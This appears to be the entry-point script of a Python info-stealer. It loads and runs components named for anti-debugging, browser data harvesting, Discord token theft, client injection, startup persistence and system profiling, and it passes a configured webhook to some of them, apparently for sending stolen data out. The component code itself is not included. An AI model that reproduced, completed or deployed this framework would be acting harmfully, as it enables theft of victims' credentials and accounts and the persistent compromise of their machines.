import components.antidebug as antidebug
import components.browsers as browsers
import components.discordtoken as discordtoken
import components.injection as injection
import components.startup as startup
import components.systeminfo as systeminfo
from config import CONFIG


COMPONENTS = [
    antidebug.AntiDebug,
    browsers.Browsers,
    discordtoken.DiscordToken,
    injection.Injection,
    startup.Startup,
    systeminfo.SystemInfo,
]


def main():
    for component in COMPONENTS:
        if CONFIG[component.__name__.lower()]:
            try:
                if component.__init__.__code__.co_argcount == 2:
                    component(CONFIG['webhook'])
                else:
                    component()

            except Exception as e:
                print(f'Error in {component.__name__}: {e}')


if __name__ == '__main__':
    main()
